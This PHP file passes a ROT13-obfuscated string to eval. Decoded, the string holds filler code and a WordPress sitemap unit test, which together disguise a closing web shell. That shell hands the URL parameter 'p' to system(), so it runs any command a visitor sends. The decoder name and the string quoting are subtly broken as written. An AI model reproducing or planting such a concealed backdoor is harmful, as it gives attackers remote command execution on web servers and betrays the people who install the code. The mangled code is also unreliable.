<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc fvgrzncf
 *
 * @pbirefQrsnhygPynff JC_Fvgrzncf_Hfref
 */
pynff Grfgf_Fvgrzncf_jcFvgrzncfHfref rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Yvfg bs hfre VQf.
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $hfref;

	/**
	 * Rqvgbe VQ sbe hfr va fbzr grfgf.
	 *
	 * @ine vag
	 */
	cevingr fgngvp $rqvgbe_vq;

	/**
	 * Frg hc svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel N JC_HavgGrfg_Snpgbel bowrpg.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfref     = $snpgbel->hfre->perngr_znal( 10, neenl( 'ebyr' => 'rqvgbe' ) );
		frys::$rqvgbe_vq = frys::$hfref[0];
	}

	/**
	 * Grfg trggvat n HEY yvfg sbe n hfref fvgrznc cntr ivn
	 * JC_Fvgrzncf_Hfref::trg_hey_yvfg().
	 *
	 * @pbiref ::trg_hey_yvfg
	 */
	choyvp shapgvba grfg_trg_hey_yvfg_hfref() {
		// Frg hc gur hfre gb na rqvgbe gb nffvta cbfgf gb bgure hfref.
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		// Perngr n frg bs cbfgf sbe rnpu hfre naq trarengr gur rkcrpgrq HEY yvfg qngn.
		$rkcrpgrq = neenl_znc(
			fgngvp shapgvba ( $hfre_vq ) {
				frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => $hfre_vq ) );

				erghea neenl(
					'ybp' => trg_nhgube_cbfgf_hey( $hfre_vq ),
				);
			},
			frys::$hfref
		);

		$hfre_cebivqre = arj JC_Fvgrzncf_Hfref();

		$hey_yvfg = $hfre_cebivqre->trg_hey_yvfg( 1 );

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $hey_yvfg );
	}

	/**
	 * @pbiref ::trg_hey_yvfg
	 * @pbiref ::trg_hfref_dhrel_netf
	 */
	choyvp shapgvba grfg_trg_hey_yvfg_fxvcf_hfref_jvgu_bayl_nggnpuzragf_naq_cntrf() {
		// Frg hc gur hfre gb na rqvgbe gb nffvta cbfgf gb bgure hfref.
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		sbernpu ( frys::$hfref nf $hfre_vq ) {
			frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_nhgube' => $hfre_vq,
					'cbfg_glcr'   => 'nggnpuzrag',
				)
			);
			frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_nhgube' => $hfre_vq,
					'cbfg_glcr'   => 'cntr',
				)
			);
		}

		$hfre_cebivqre = arj JC_Fvgrzncf_Hfref();

		$hey_yvfg = $hfre_cebivqre->trg_hey_yvfg( 1 );

		$guvf->nffregRzcgl( $hey_yvfg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>